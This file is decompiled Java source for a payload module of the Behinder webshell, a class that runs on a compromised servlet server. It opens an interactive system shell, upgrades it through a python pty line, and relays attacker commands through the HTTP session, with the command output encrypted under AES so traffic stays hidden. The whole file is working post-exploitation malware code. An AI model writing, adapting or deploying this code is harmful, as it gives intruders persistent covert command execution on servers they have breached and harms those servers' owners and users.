package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.nio.charset.Charset;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;

public class RealCMD implements Runnable {
   public static String bashPath;
   public static String type;
   public static String cmd;
   public static String whatever;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var11 = false;

      ServletOutputStream so = null;
      label101: {
         try {
            var11 = true;
            this.fillContext(obj);
            result.put("msg", this.runCmd());
            result.put("status", "success");
            var11 = false;
            break label101;
         } catch (Exception var15) {
            result.put("status", "fail");
            result.put("msg", var15.getMessage());
            var11 = false;
         } finally {
            if (var11) {
               try {
                  so = this.Response.getOutputStream();
                  if (result.get("msg") == null) {
                     result.put("msg", "");
                  }

                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.flush();
                  so.close();
               } catch (Exception var12) {
               }

            }
         }

         try {
            so = this.Response.getOutputStream();
            if (result.get("msg") == null) {
               result.put("msg", "");
            }

            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
         } catch (Exception var13) {
         }

         return true;
      }

      try {
         so = this.Response.getOutputStream();
         if (result.get("msg") == null) {
            result.put("msg", "");
         }

         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.flush();
         so.close();
      } catch (Exception var14) {
      }

      return true;
   }

   public RealCMD(HttpSession session) {
      this.Session = session;
   }

   public RealCMD() {
   }

   public String runCmd() throws Exception {
      String result = "";
      if (type.equals("create")) {
         this.Session.setAttribute("working", true);
         (new Thread(new RealCMD(this.Session))).start();
      } else if (type.equals("read")) {
         StringBuilder output = (StringBuilder)this.Session.getAttribute("output");
         result = output.toString();
         output.setLength(0);
      } else if (type.equals("write")) {
         String input = new String(this.base64decode(cmd));
         BufferedWriter writer = (BufferedWriter)this.Session.getAttribute("writer");
         writer.write(input);
         writer.flush();
      } else if (type.equals("stop")) {
         Process process = (Process)this.Session.getAttribute("process");
         process.destroy();
      }

      return result;
   }

   public void run() {
      Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
      StringBuilder output = new StringBuilder();

      try {
         String os = System.getProperty("os.name").toLowerCase();
         ProcessBuilder builder;
         if (os.indexOf("windows") >= 0) {
            if (bashPath == null) {
               bashPath = "c:/windows/system32/cmd.exe";
            }

            builder = new ProcessBuilder(new String[]{bashPath});
         } else {
            if (bashPath == null) {
               bashPath = "/bin/sh";
            }

            builder = new ProcessBuilder(new String[]{bashPath});
            Map envs = builder.environment();
            envs.put("TERM", "xterm");
         }

         builder.redirectErrorStream(true);
         Process process = builder.start();
         OutputStream stdin = process.getOutputStream();
         InputStream stdout = process.getInputStream();
         BufferedReader reader = new BufferedReader(new InputStreamReader(stdout, osCharset));
         BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(stdin));
         this.Session.setAttribute("reader", reader);
         this.Session.setAttribute("writer", writer);
         this.Session.setAttribute("output", output);
         this.Session.setAttribute("process", process);
         if (os.indexOf("windows") < 0) {
            String spawn = String.format("python -c 'import pty; pty.spawn(\"%s\")'", bashPath);
            writer.write(spawn + "\n");
            writer.flush();
         }

         byte[] buffer = new byte[1024];
         boolean var11 = false;

         int length;
         while((length = stdout.read(buffer)) > -1) {
            output.append(new String(Arrays.copyOfRange(buffer, 0, length)));
         }
      } catch (IOException var12) {
         output.append(var12.getMessage());
      }

   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] base64decode(String text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result = null;

      try {
         Class Base64;
         Object Decoder;
         if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
         } else {
            this.getClass();
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
         }
      } catch (Exception var6) {
      }

      return result;
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getAttribute("u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = (HttpSession)objMap.get("session");
         this.Response = (ServletResponse)objMap.get("response");
         this.Request = (ServletRequest)objMap.get("request");
      }

      this.Response.setCharacterEncoding("UTF-8");
   }
}
